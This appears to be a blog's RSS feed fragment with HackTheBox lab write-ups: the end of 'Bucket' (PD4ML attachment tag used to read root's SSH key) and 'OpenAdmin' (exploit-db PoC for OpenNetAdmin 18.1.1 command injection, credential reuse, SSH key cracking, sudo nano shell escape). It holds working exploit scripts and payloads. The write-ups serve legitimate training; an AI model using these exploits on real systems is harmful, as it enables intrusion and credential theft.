        {<span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span>}
}
</code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm">source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
<p><code>payload.json</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;title&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Ransomware&#34;</span> }, 
    <span style="color:#f92672">&#34;data&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> }
}
</code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
<p><code>getroot.sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
echo <span style="color:#e6db74">&#34;[+] Create table&#34;</span>
aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Insert item&#34;</span>
aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style="color:#e6db74">&#34;[+] Send get alerts&#34;</span>
curl -svd <span style="color:#e6db74">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span style="color:#75715e"># The port 8000 on Bucket forwarded to localhost:8000</span>
</code></pre></div><blockquote>
<p>The script assume all the required files are stored in the same folder.</p>
</blockquote>
<p>I’ll watch the result.pdf at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 2; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ ./getroot.sh  

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Create table
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Insert item
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send get alerts
*   Trying 127.0.0.1:8000...
* TCP_NODELAY set
* Connected to 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
&gt; POST / HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.66.0
&gt; Accept: */*
&gt; Content-Length: <span style="color:#ae81ff">17</span>
&gt; Content-Type: application/x-www-form-urlencoded
&gt; 
* upload completely sent off: <span style="color:#ae81ff">17</span> out of <span style="color:#ae81ff">17</span> bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
&lt; Date: Thu, <span style="color:#ae81ff">22</span> Apr <span style="color:#ae81ff">2021</span> 20:04:14 GMT
&lt; Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
&lt; Content-Length: <span style="color:#ae81ff">0</span>
&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
&lt; 
* Connection <span style="color:#75715e">#0 to host 127.0.0.1 left intact</span>
</code></pre></div><p>On <code>roy</code> shell, I can see it captured the ssh key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...&lt;SNIP&gt;...
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>The full process as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
</p>
<p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ chmod <span style="color:#ae81ff">600</span> root_rsa
</code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh -i root_rsa 10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
root@bucket:~# id;hostname;cut -c-15 root.txt 
uid=0(root) gid=0(root) groups=0(root)
bucket
efc73dd09ceb705
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3">https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3</a></li>
<li><a href="https://pd4ml.com/html.htm">https://pd4ml.com/html.htm</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - OpenAdmin</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</link>
      <pubDate>Fri, 02 Apr 2021 04:25:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</guid>
      <description>Exploiting OpenNetAdmin vulnerability and sudo nano</description>
      <content:encoded><![CDATA[<p>OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>OpenNetAdmin 18.1.1 exploitation</li>
<li>Exploiting sudo privileges on nano</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Dirb - Preinstalled in Kali Linux</li>
<li>John The Ripper - <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ nmap -sV -sC -oA OpenAdmin <span style="color:#e6db74">&#39;10.10.10.171&#39;</span> -v
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all formats</li>
<li><code>-v</code>, verbose mode</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p>
<ul>
<li>An SSH service running on port 22</li>
<li>An HTTP service running on port 80</li>
</ul>
<p>Also, from the scan above, the machine is likely running Ubuntu.</p>
<p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP  80 - Website</h3>
<p>Visiting the standard http port only displays the Apache default page.</p>
<p><div class="img-container"><img src="imgs/4fb96d89a99c4244bb54291abd974267.png" alt="1ad0727e5956f0800cbe4ec0c02df451.png"  /></div>
</p>
<h4 id="directory-brute-force---dirb">Directory Brute Force - dirb</h4>
<p>Running  <code>dirb</code>  against the web successfully discovered a few hidden paths.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
...&lt;SNIP&gt;...
---- Scanning URL: http://10.10.10.171/ ----
<span style="color:#f92672">==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
+ http://10.10.10.171/index.html<span style="color:#f92672">(</span>CODE:200|SIZE:10918<span style="color:#f92672">)</span> 
<span style="color:#f92672">==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
+ http://10.10.10.171/server-status <span style="color:#f92672">(</span>CODE:200|SIZE:278<span style="color:#f92672">)</span>
...&lt;SNIP&gt;...
</code></pre></div><h4 id="artwork">/artwork/</h4>
<p>Nothing here.</p>
<p><div class="img-container"><img src="imgs/image-20210402000812490.png" alt="image-20210402000812490"  /></div>
</p>
<h4 id="music">/music/</h4>
<p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p>
<p><div class="img-container"><img src="imgs/image-20210402000847660.png" alt="image-20210402000847660"  /></div>
</p>
<h4 id="ona">/ona/</h4>
<p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p>
<p><div class="img-container"><img src="imgs/88b4ba1460574b0f88a4acd81e00d392.png" alt="f0df4d83acc69be1e666eb6e40a73494.png"  /></div>
</p>
<p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="exploit-poc-for-opennetadmin-1811">Exploit PoC for OpenNetAdmin 18.1.1</h4>
<p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:</p>
<blockquote>
<p>PoC: <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">while</span> true;<span style="color:#66d9ef">do</span>
 echo -n <span style="color:#e6db74">&#34;</span>$<span style="color:#e6db74"> &#34;</span>; read cmd
 curl --silent -d <span style="color:#e6db74">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span style="color:#e6db74">${</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | sed -n -e <span style="color:#e6db74">&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
<span style="color:#66d9ef">done</span>
</code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>, and below is the issued command to run the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ ./OpenRCE.sh http://openadmin.htb/ona/
</code></pre></div><p><div class="img-container"><img src="imgs/2371e9e41f8449479f1bd8f24e8af888.png" alt="db477cc560e79f4bf705987c3188ee25.png"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jimmy">Shell as jimmy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat ./local/config/database_settings.inc.php
&lt;?php

$ona_contexts<span style="color:#f92672">=</span>array <span style="color:#f92672">(</span>
  <span style="color:#e6db74">&#39;DEFAULT&#39;</span> <span style="color:#f92672">=</span>&gt; 
  array <span style="color:#f92672">(</span>
    <span style="color:#e6db74">&#39;databases&#39;</span> <span style="color:#f92672">=</span>&gt; 
    array <span style="color:#f92672">(</span>
      0 <span style="color:#f92672">=</span>&gt; 
      array <span style="color:#f92672">(</span>
        <span style="color:#e6db74">&#39;db_type&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;mysqli&#39;</span>,
        <span style="color:#e6db74">&#39;db_host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,
        <span style="color:#e6db74">&#39;db_login&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_sys&#39;</span>,
        <span style="color:#e6db74">&#39;db_passwd&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;n1nj4W4rri0R!&#39;</span>,
        <span style="color:#e6db74">&#39;db_database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ona_default&#39;</span>,
        <span style="color:#e6db74">&#39;db_debug&#39;</span> <span style="color:#f92672">=</span>&gt; false,
      <span style="color:#f92672">)</span>,
    <span style="color:#f92672">)</span>,
    <span style="color:#e6db74">&#39;description&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;Default data context&#39;</span>,
    <span style="color:#e6db74">&#39;context_color&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;#D3DBFF&#39;</span>,
  <span style="color:#f92672">)</span>,
<span style="color:#f92672">)</span>;
</code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p>
<p><div class="img-container"><img src="imgs/25ec2fca7eb84dad9f748aeb299ef35b.png" alt="a0518e175f0d68951eac7bbb348b24e0.png"  /></div>
</p>
<h3 id="shell-as-joanna">Shell as joanna</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null

...&lt;SNIP&gt;...
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/login.php
...&lt;SNIP&gt;...
</code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p>
<p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

&lt;VirtualHost 127.0.0.1:52846&gt;
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

&lt;IfModule mpm_itk_module&gt;
AssignUserID joanna joanna
&lt;/IfModule&gt;

    ErrorLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/error.log
    CustomLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/access.log combined

&lt;/VirtualHost&gt;
</code></pre></div><h4 id="code-review---improper-redirection">Code review - Improper redirection</h4>
<p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:/var/www/internal/$ cat main.php

&lt;?php session_start<span style="color:#f92672">()</span>; <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!isset <span style="color:#f92672">(</span>$_SESSION<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span> header<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location: /index.php&#34;</span><span style="color:#f92672">)</span>; <span style="color:#f92672">}</span>; 
<span style="color:#75715e"># Open Admin Trusted</span>
<span style="color:#75715e"># OpenAdmin</span>
$output <span style="color:#f92672">=</span> shell_exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span style="color:#f92672">)</span>;
echo <span style="color:#e6db74">&#34;&lt;pre&gt;</span>$output<span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
?&gt;
&lt;html&gt;
&lt;h3&gt;Don<span style="color:#960050;background-color:#1e0010">&#39;</span>t forget your <span style="color:#e6db74">&#34;ninja&#34;</span> password&lt;/h3&gt;
Click here to logout &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logout.php&#34;</span> tite <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Logout&#34;</span>&gt;Session
&lt;/html&gt;
</code></pre></div><p>This line code has an improper redirection.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">session_start</span>(); 
	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span> ($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>])) { 
		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: /index.php&#34;</span>); 
        <span style="color:#75715e"># `die();` or `exit();` function should be called here.
</span><span style="color:#75715e"></span>	};
<span style="color:#f92672">...&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;...</span>
$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cat /home/joanna/.ssh/id_rsa&#39;</span>);
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;</span><span style="color:#e6db74">$output</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
</span></code></pre></div><p>The code above checks users' sessions but it&rsquo;s not complete yet because the <code>die()</code> or <code>exit()</code> function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with <code>curl</code> (default without <code>-L</code> option) will prevent the page from redirection and then it renders <code>joanna</code>&rsquo;s SSH key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php
</code></pre></div><p><div class="img-container"><img src="imgs/ea391edd6c66409d8bb551eecdac08d5.png" alt="6b73c3ba7aa0ba3e068b85435dc8aeb1.png"  /></div>
</p>
<h4 id="password-cracking">Password cracking</h4>
<p>The private key is encrypted with a password.   <code>JtR</code> can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using <code>ssh2john.py</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ python ssh2john.py joanna_rsa &gt; joanna_rsa.hash
</code></pre></div><p>The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">john.exe user2.txt --wordlist=rockyou.txt
</code></pre></div><p><div class="img-container"><img src="imgs/fa7463b8239345409a2250597b3dfa69.png" alt="ca148e3ae5b2e8b65406e0d387ca1771.png"  /></div>
</p>
<h4 id="ssh-access-1">SSH access</h4>
<p>Now I can login as user <code>joanna</code> via SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ ssh -i joanna_rsa joanna@10.10.10.171
</code></pre></div><p><div class="img-container"><img src="imgs/673cb008921d4eba886820c17fef43a0.png" alt="8f710060b1059b0ddb7cae2253e0c1ac.png"  /></div>
</p>
<p>The user flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-nano">Abusing sudo nano</h4>
<p>User <code>joanna</code> has sudo privileges on <code>/bin/nano</code></p>
<blockquote>
<p>On linux boxes, whenever you own a valid user password, always check <code>sudo -l</code> !</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> joanna on openadmin:
    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User joanna may run the following commands on openadmin:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /bin/nano /opt/priv
</code></pre></div><p>A quick way to read the root flag is by issuing the command below,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv
</code></pre></div><p>and then hit <code>CTRL + R</code> to open a file, this allows us to read the root flag at  <code>/root/root.txt</code></p>
<center>
<p><div class="img-container"><img src="imgs/image-20210404121427744.png" alt="image-20210404121427744"  /></div>
</p>
</center>
<p>To gain root shell as follows I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> page:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv <span style="color:#75715e"># Opening nano as root</span>
^R^X <span style="color:#75715e"># CTRL+R (read/open file), CTRL+X(execute command)</span>
reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span> <span style="color:#75715e"># Escape from nano</span>
</code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
